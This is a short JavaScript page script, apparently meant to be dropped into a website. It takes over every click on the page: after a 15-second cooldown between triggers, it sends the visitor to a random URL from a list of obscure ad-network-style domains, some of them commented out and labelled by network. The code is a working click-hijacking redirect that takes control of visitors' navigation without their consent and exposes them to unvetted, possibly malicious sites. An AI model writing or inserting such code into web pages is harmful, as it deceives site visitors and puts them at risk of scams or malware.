function init() {
  var arr = [
    // hil: dabao
    "https://grim-package.com/bO3WV.0sPU3rp/vSbumMVaJkZVD/0U1/N/DDMG2sOOTWcm2zL-TSUR0mMhzbYS5oNYz/cJ",
    "https://www.qrcreate.online",

    // mon: db
    "https://teksishe.net/4/7420698",
    // "https://vaikijie.net/4/7237921",
    // "https://aigheebsu.net/4/7420696",
    // "https://groulrob.com/4/7237907",
    "https://fodsoack.com/4/7420689",
    // "https://choufauphik.net/4/7474716",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);